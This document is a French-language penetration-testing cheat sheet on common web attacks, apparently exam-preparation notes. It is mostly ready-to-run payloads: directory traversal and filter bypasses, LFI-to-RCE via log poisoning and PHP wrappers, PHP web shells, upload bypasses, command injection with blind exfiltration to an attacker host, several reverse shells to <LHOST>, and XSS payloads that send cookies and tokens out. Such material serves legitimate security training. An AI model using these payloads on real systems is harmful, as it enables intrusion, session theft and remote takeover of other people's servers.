# 08 — Common Web Application Attacks

## Objectifs
Exploiter les faiblesses classiques **à la main** : directory traversal, LFI/RFI, file upload, command injection, XSS, CSRF. En examen, la version manuelle est celle qui passe.

---

## 1. Directory traversal

```bash
curl -s "http://<TARGET>/download?file=../../../../etc/passwd"
curl -s --path-as-is "http://<TARGET>/static/../../../../etc/passwd"
```

### Bypass de filtres
| Filtre | Contournement |
|---|---|
| `../` supprimé | `....//`, `..././`, `..%2f`, `%2e%2e%2f` |
| Extension forcée | null byte `%00` (PHP < 5.3.4), `?file=x.php/../../etc/passwd` |
| Chemin absolu bloqué | `/etc/passwd` direct, `/proc/self/root/etc/passwd` |
| Double décodage | `%252e%252e%252f` |

```bash
# Fichiers Linux utiles
/etc/passwd  /etc/shadow  /etc/hosts  /proc/self/environ  /home/<USER>/.ssh/id_rsa
# Windows
C:\Windows\win.ini  C:\Windows\System32\drivers\etc\hosts  C:\inetpub\wwwroot\web.config
```

---

## 2. LFI → RCE

### a) Log poisoning
```bash
# Injecter du PHP dans un log accessible
curl -s "http://<TARGET>/index.php?page=../../../../var/log/apache2/access.log" \
     -A "<?php system(\$_GET['c']); ?>"
# Déclencher
curl -s "http://<TARGET>/index.php?page=../../../../var/log/apache2/access.log&c=id"
```

Autres logs : `/var/log/auth.log` (via `ssh '<?php ...?>'@host`), `/var/log/vsftpd.log` (login `<?php ...?>`).

### b) PHP wrappers
```bash
# Lecture de source en base64
curl -s "http://<TARGET>/index.php?page=php://filter/convert.base64-encode/resource=index.php" | base64 -d
curl -s "http://<TARGET>/index.php?page=php://filter/convert.base64-encode/resource=config.php" | base64 -d

# RCE via data:// (si allow_url_include)
curl -s "http://<TARGET>/index.php?page=data://text/plain,<?php system('id'); ?>"
curl -s "http://<TARGET>/index.php?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg=="

# expect:// (rare)
```

### c) Fichiers de session
```bash
# Écrire du PHP dans une valeur de session, puis l'inclure
curl -s -c cookies.txt -d "username=<?php system(\$_GET['c']); ?>&password=x" http://<TARGET>/login.php
curl -s -b cookies.txt "http://<TARGET>/index.php?page=/var/lib/php/sessions/sess_<ID>"
```

### d) `/proc/self/environ`
```bash
curl -s -A "<?php system(\$_GET['c']); ?>" "http://<TARGET>/index.php?page=/proc/self/environ&c=id"
```

---

## 3. RFI

```bash
# Hôte un fichier PHP malveillant
echo '<?php system($_GET["c"]); ?>' > shell.php
python3 -m http.server 80

# Inclure
curl -s "http://<TARGET>/index.php?page=http://<LHOST>/shell.php&c=id"
```

Prérequis : `allow_url_include=On` (visible via `phpinfo` ou erreur). Sinon, `data://` fonctionne souvent.

### Reverse shell via LFI/RFI
```bash
# shell.php
<?php system("bash -c 'bash -i >& /dev/tcp/<LHOST>/4444 0>&1'"); ?>
# ou
<?php passthru("/bin/bash -c 'bash -i >& /dev/tcp/<LHOST>/4444 0>&1'"); ?>
```

---

## 4. File upload

### Test de base
```bash
curl -s -F "file=@shell.php" http://<TARGET>/upload.php
curl -s http://<TARGET>/uploads/shell.php?c=id
```

### Contournements
| Défense | Bypass |
|---|---|
| Extension `.php` refusée | `.php5`, `.phtml`, `.phar`, `.php7`, `.pht` |
| Double extension | `shell.php.jpg`, `shell.jpg.php` |
| Content-Type vérifié | forcer `image/jpeg` |
| Magic bytes vérifiés | GIF89a + PHP, ou polyglot |
| `getimagesize()` | image valide + code PHP en commentaire EXIF |
| Nom filtré | `%00`, `.htaccess` pour mapper l'extension |
| Dossier non exécutable | upload de `.htaccess` dans un sous-dossier |

```bash
# Forcer le Content-Type
curl -s -F "file=@shell.php;type=image/jpeg" http://<TARGET>/upload.php

# Polyglot GIF/PHP
(printf 'GIF89a;\n'; echo '<?php system($_GET["c"]); ?>') > shell.gif.php

# .htaccess pour exécuter .jpg en PHP
echo 'AddType application/x-httpd-php .jpg' > .htaccess
```

### Zip slip / SVG / XXE via upload
```bash
# SVG avec XXE
cat > x.svg <<'EOF'
<?xml version="1.0"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>
EOF
```

---

## 5. Command injection

```bash
# Séparateurs
;  |  ||  &&  $()  ``  %0a  \n
curl -s "http://<TARGET>/ping?ip=127.0.0.1;id"
curl -s "http://<TARGET>/ping?ip=127.0.0.1%0aid"
curl -s "http://<TARGET>/ping?ip=127.0.0.1|whoami"
curl -s "http://<TARGET>/ping?ip=\$(id)"
```

### Filtres d'espaces et de caractères
| Blocage | Contournement |
|---|---|
| Espace | `${IFS}`, `%09`, `$IFS$9`, `{cat,/etc/passwd}` |
| `/` | `${PATH:0:1}`, `$(printf '\57')` |
| `cat` | `tac`, `head`, `less`, `more`, `nl`, `xxd`, `base64` |
| Caractères spéciaux | encoder en URL double |
| Commande bloquée | chemin complet `/bin/cat` |

```bash
# Blind : tester le temps
curl -s "http://<TARGET>/ping?ip=127.0.0.1;sleep 5"

# Blind : exfiltration DNS/HTTP
curl -s "http://<TARGET>/ping?ip=127.0.0.1;curl http://<LHOST>/$(whoami)"
python3 -m http.server 80   # observer la requête
```

### Reverse shell
```bash
bash -i >& /dev/tcp/<LHOST>/4444 0>&1
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> 4444 >/tmp/f
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<LHOST>",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call(["/bin/sh","-i"])'
```

---

## 6. XSS (utile pour voler une session admin)

```html
<script>fetch('http://<LHOST>/?c='+document.cookie)</script>
<img src=x onerror="fetch('http://<LHOST>/?c='+document.cookie)">
<svg onload="fetch('http://<LHOST>/?c='+localStorage.getItem('token'))">
```

```bash
# Listener
python3 -m http.server 80   # ou nc -lvnp 80
```

Contextes : entre balises, dans un attribut, dans du JS, dans un `href`. Adapter : `"><script>`, `';alert(1)//`, `javascript:alert(1)`.

Pour un CSRF : forger un formulaire auto-soumis vers l'action admin.

---

## 7. Checklist d'exploitation web

- [ ] Chaque paramètre testé : `'`, `"`, `../../`, `;id`, `{{7*7}}`, `http://<LHOST>`
- [ ] LFI : `/etc/passwd` → logs → wrappers → RCE
- [ ] Upload : extension, Content-Type, magic bytes, `.htaccess`
- [ ] Injection de commande : séparateurs + blind (sleep, DNS)
- [ ] XSS réfléchi puis stocké (cible : admin)
- [ ] Reverse shell obtenu et **stabilisé**
- [ ] Preuve sauvegardée immédiatement
